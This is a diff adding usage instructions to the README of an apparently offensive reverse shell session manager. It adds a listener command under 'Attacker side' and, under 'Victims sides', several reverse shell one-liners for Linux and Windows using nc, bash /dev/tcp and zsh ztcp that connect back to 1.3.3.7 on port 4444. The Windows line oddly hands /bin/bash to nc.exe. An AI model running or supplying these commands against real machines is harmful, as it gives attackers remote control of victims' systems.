@@ -4,6 +4,22 @@
 A multiple reverse shell sessions/clients manager via terminal
 ```
 
+#### Attacker side
+```
+python Reverse-Shell-Manager.py 0.0.0.0 4444
+```
+#### Victims sides
+> Linux
+```
+nc -e /bin/bash 1.3.3.7 4444
+bash -c 'bash -i >/dev/tcp/1.3.3.7/4444 0>&1'
+zsh -c 'zmodload zsh/net/tcp && ztcp 1.3.3.7 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+```
+> Windows
+```
+nc.exe -e /bin/bash 1.3.3.7 4444
+```
+
 #### Simple Example Video 
 
 [![asciicast](https://asciinema.org/a/143640.png)](https://asciinema.org/a/143640)
